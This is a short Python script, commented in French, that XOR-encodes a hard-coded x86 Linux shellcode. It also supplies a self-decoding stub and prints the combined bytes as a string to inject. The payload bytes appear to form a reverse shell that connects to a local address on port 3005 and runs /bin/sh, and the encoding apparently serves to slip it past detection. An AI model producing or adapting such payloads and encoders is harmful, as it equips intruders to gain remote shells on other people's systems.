import re

shellcode_decrypt_for_decryption = "eb 1a 5e 31 c9 80 c1 02 31 d2 8a 54 0e fe 30 54 0e ff 80 c1 01 80 f9 09 75 ee eb 05 e8 e1 ff ff ff".lower()
shellcode = "31 c0 31 db 31 c9 68 7f 01 01 01 66 68 0b bd 66 b8 67 01 b3 02 66 53 41 31 d2 cd 80 89 c3 66 b8 6a 01 89 e1 b2 10 cd 80 50 68 6e 2f 73 68 68 2f 2f 62 69 04 03 89 c1 b0 3f 49 cd 80 75 f9 89 c8 b2 0b 92 8d 1c 24 89 e3 cd 80 40 31 db".lower()

def intToStrHex(byte_code):
    byte_code = str(hex(byte_code))[2:]
    return '0'+byte_code if len(byte_code) == 1 else byte_code

def comparePaylaod(s1, s2):
    is_equal = True
    if(len(s1) != len(s2)):
        print("Les paylaod n'ont pas la même taille ({} -- {}).".format(len(s1.split(" ")), len(s2.split(" "))))
        return False
    
    for i in range(len(s1)):
        if(s1[i] != s2[i]):
            is_equal = False
            # print("[{}] Erreur : {} != {}".format(i, s1[i], s2[i]))
    return is_equal


def encrypt(shellcode):
    shellcode_encode = ""
    shellcode = shellcode.split(" ")
    for i in range(len(shellcode)-1, 0, -1):
        byte_code = int(shellcode[i], 16)
        ########################################################################
        # byte_code = byte_code + i
        byte_code = byte_code ^ int(shellcode[i-1], 16)
        # byte_code = byte_code + 1
        ########################################################################
        byte_code = intToStrHex(byte_code)
        shellcode_encode = byte_code + " " + shellcode_encode
    shellcode_encode = intToStrHex(int(shellcode[0], 16)) + " " + shellcode_encode
    return shellcode_encode[:-1]

def decrypt(shellcode):
    # shellcode_encode = ""
    shellcode = shellcode.split(" ")
    print("shellcode ==> ", shellcode)
    shellcode_encode = shellcode[0]
    print("shellcode ==> ", shellcode_encode)
    # shellcode_encode = shellcode_encode + " " + intToStrHex(int(shellcode[i], 16))
    edx = shellcode[0]
    for i in range(1, len(shellcode)):
        byte_code = int(shellcode[i], 16)
        ########################################################################
        byte_code = byte_code ^ int(edx, 16)
        # byte_code = byte_code - 1
        # byte_code = byte_code - i
        ########################################################################
        byte_code = intToStrHex(byte_code)
        edx = byte_code

        shellcode_encode = shellcode_encode + " " + byte_code
    return shellcode_encode

shellcode_enc = encrypt(shellcode)
shellcode_dec = decrypt(shellcode_enc)

print("[~] shellcode ==> {} -- {}\n".format(shellcode, len(shellcode.split(" "))))
print("[+] shellcode ==> {} -- {}\n".format(shellcode_enc, len(shellcode_enc.split(" "))))
print("[-] shellcode dec ==> {} -- {}\n".format(shellcode_dec, comparePaylaod(shellcode, shellcode_dec)))

if(comparePaylaod(shellcode, shellcode_dec)):
    print(r"shellcode to inject ==> \x{}\x{}".format(shellcode_decrypt_for_decryption.replace(" ", r"\x"), shellcode_dec.replace(" ", r"\x")))
else:
    print("Impossible to decrypt the encrypted version.")